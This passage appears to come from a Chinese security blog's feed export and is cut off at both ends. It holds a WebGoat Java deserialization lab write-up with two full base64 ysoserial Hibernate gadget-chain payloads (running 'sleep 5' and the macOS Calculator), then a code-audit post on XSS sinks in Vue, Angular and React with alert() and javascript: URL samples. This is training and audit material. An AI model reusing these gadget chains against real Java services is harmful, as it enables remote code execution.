3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2VyaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
<ol>
<li>识别反序列化流量</li>
<li>找到相应可利用执行命令的组件</li>
</ol>
<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBABFqYXZhL2xhbmcvUHJvY2VzcwcANgEAB3dhaXRGb3IBAAMoKUkMADgAOQoANwA6AQANU3RhY2tNYXBUYWJsZQEAHXlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0AQAfTHlzb3NlcmlhbC9Qd25lcjI4MzEwMDEyMDg1NDQ0OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>

<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/engine/spi/TypedValue.class</code></p>
<p><img src="/2019/09/28/WebGoat-Deserialization/TypeValue.png" alt="TypeValue"></p>
<p><code>/Users/seikei/.m2/repository/org/hibernate/hibernate-core/5.0.12.Final/hibernate-core-5.0.12.Final.jar!/org/hibernate/property/access/spi/GetterMethodImpl.class</code></p>
<p><img src="/2019/09/28/WebGoat-Deserialization/GetterMethodImpl.png" alt="GetterMethodImpl"></p>
<p><code>/Applications/IntelliJ IDEA.app/Contents/jbr/Contents/Home!/java.xml/jdk/xml/internal/JdkXmlFeatures.class</code></p>
<p><img src="/2019/09/28/WebGoat-Deserialization/JdkXmlFeatures.png" alt="JdkXmlFeatures"></p>
<h2 id="Java报错"><a href="#Java报错" class="headerlink" title="Java报错"></a>Java报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Error:java: error: release version 5 not supported</span><br></pre></td></tr></table></figure>

<p>在maven中添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>前端框架中XSS的代码表现形式</title>
    <url>/2020/05/21/XSS-in-front/</url>
    <content><![CDATA[<p>随着前端技术的发展，越来越多的框架默认对XSS做了有效的防范，遵循secure by default原则。</p>
<p>如果不了解前端框架本身的安全特性，就会导致代码审计过程中对XSS的审计不严密。</p>
<p>本文是从代码审计的视角去看不同前端框架中可能导致XSS的代码写法。</p>
<a id="more"></a>

<p>参考：<a href="https://sqreen.github.io/VueXSSDemo/#/" target="_blank" rel="noopener">https://sqreen.github.io/VueXSSDemo/#/</a></p>
<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><p>Vue使用双大括号<code></code>将参数显示在浏览器中，双大括号默认将其中的数据解析为普通文本，而非 HTML 代码，这样避免了XSS的产生。</p>
<p>其他输出指令也同样会将数据解析为普通文本，比如<code>v-model</code></p>
<p>当然实际业务中也存在输出HTML代码的需求，若想输出真正的 HTML，就需要使用 <code>v-html</code> 指令</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Using mustaches: &#123;&#123; rawHtml &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Using v-html directive: <span class="tag">&lt;<span class="name">span</span> <span class="attr">v-html</span>=<span class="string">"rawHtml"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>若此时rawHtml为<code>&lt;span style=&quot;color: red&quot;&gt;This should be malicious.&lt;/span&gt;</code>，实际效果如下图：</p>
<img src="/2020/05/21/XSS-in-front/vue-xss.png" alt="vue-xss" style="zoom:30%;">



<p><code>v-html</code>的内容会被浏览器当作HTML字符解析，会导致XSS漏洞产生。</p>
<blockquote>
<p><strong>代码审计关键</strong>：注意<code>v-html</code>，<code>v-html</code>输出的值若用户可控，就可能存在XSS。</p>
</blockquote>
<p>来源：<a href="https://cn.vuejs.org/v2/guide/syntax.html#%E5%8E%9F%E5%A7%8B-HTML" target="_blank" rel="noopener">https://cn.vuejs.org/v2/guide/syntax.html#原始-HTML</a></p>
<h1 id="Angular"><a href="#Angular" class="headerlink" title="Angular"></a>Angular</h1><p>Angular同样默认把所有值都当做不可信任的。 当值从模板中以属性（Property）、DOM 元素属性（Attribte)、CSS 类绑定或插值等途径插入到 DOM 中的时候， Angular 将对这些值进行无害化处理（Sanitize），对不可信的值进行编码。</p>
<p>在低版本（&lt;1.6）的Angular中，存在模版注入的漏洞，用户直接传入<code>49</code>会将<code>7*7</code>插入到Angular的解析之中导致代码执行。</p>
<p>但前端框架更新速度是非常快的，截止到写文章，目前最新的Angular版本为<code>v9.1.9</code>，及时更新可以一定程度避免框架本身导致的漏洞。</p>
<p>回到前端开发利用Angular框架回显参数时触发XSS的问题上来。</p>
<p>和Vue一样，Angular也使用双大括号<code></code>将数据显示在浏览器中，双大括号默认将其中的数据解析为普通文本</p>
<p>不同的是Angular使用<code>[innerHTML]</code>来表示其中的内容会被浏览器正常解析，不过Angular会识别其中的值，并将其进行无害化处理。</p>
<p>比如存在以下场景，一处使用<code></code>显示<code>htmlSnippet</code>，另一处使用<code>[innerHTML]=&quot;htmlSnippet&quot;</code>显示<code>htmlSnippet</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Binding innerHTML<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Bound value:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"e2e-inner-html-interpolated"</span>&gt;</span>&#123;&#123;htmlSnippet&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Result of binding to innerHTML:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"e2e-inner-html-bound"</span> [<span class="attr">innerHTML</span>]=<span class="string">"htmlSnippet"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当htmlSnippet的内容如下时</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">htmlSnippet = 'Template <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">"seikei"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">b</span>&gt;</span>Syntax<span class="tag">&lt;/<span class="name">b</span>&gt;</span>';</span><br></pre></td></tr></table></figure>

<p>得到的结果如下，最后一行<code>&lt;script&gt;</code>标签不见了，不过它不是被浏览器解析了，而是被Angular自动进行了无害化处理，移除了<code>&lt;script&gt;</code>标签，保留安全的内容，比如片段中的<code>&lt;b&gt;</code>标签。</p>
<img src="/2020/05/21/XSS-in-front/angular-xss-sanitize.png" alt="angular-xss-sanitize" style="zoom:33%;">



<p>那万一Angular无害化处理器把业务所需的内容过滤了怎么办呢？</p>
<p>为了防止这种情况，Angular可以使用以下方法把值标记为可信任的，这样无害化处理器就不会再对该值进行过滤。</p>
<ul>
<li><code>bypassSecurityTrustHtml</code></li>
<li><code>bypassSecurityTrustScript</code></li>
<li><code>bypassSecurityTrustStyle</code></li>
<li><code>bypassSecurityTrustUrl</code></li>
<li><code>bypassSecurityTrustResourceUrl</code></li>
</ul>
<p>如下场景</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>An untrusted URL:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"e2e-dangerous-url"</span> [<span class="attr">href</span>]=<span class="string">"dangerousUrl"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>A trusted URL:<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"e2e-trusted-url"</span> [<span class="attr">href</span>]=<span class="string">"trustedUrl"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>dangerousUrl为恶意代码，trustedUrl是经过信任的代码，可以不经过无害化处理器直接解析。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">dangerousUrl = <span class="string">'javascript:alert("Hi seikei")'</span>;</span><br><span class="line">trustedUrl = sanitizer.bypassSecurityTrustUrl(dangerousUrl);</span><br></pre></td></tr></table></figure>

<p>结果是trusted URL会导致XSS产生，而untrusted不会。</p>
<img src="/2020/05/21/XSS-in-front/angular-xss.png" alt="angular-xss" style="zoom:33%;">



<blockquote>
<p><strong>代码审计关键</strong>：注意<code>[innerHTML]</code>、<code>[href]</code>、<code>[src]</code>等，再关注其传入的值是否经过<code>bypassSecurityTrust</code>标记为信任，若值是信任的且用户可控，就可能存在XSS漏洞。</p>
</blockquote>
<p>来源：<a href="https://angular.cn/guide/security#xss" target="_blank" rel="noopener">https://angular.cn/guide/security#xss</a></p>
<h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><p>React使用<code>dangerouslySetInnerHTML</code>作为HTML输入的方法，并且需要向其传递包含 key 为 <code>__html</code> 的对象。只有使用<code>dangerouslySetInnerHTML</code>会存在XSS。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SetHtml</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>()&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span 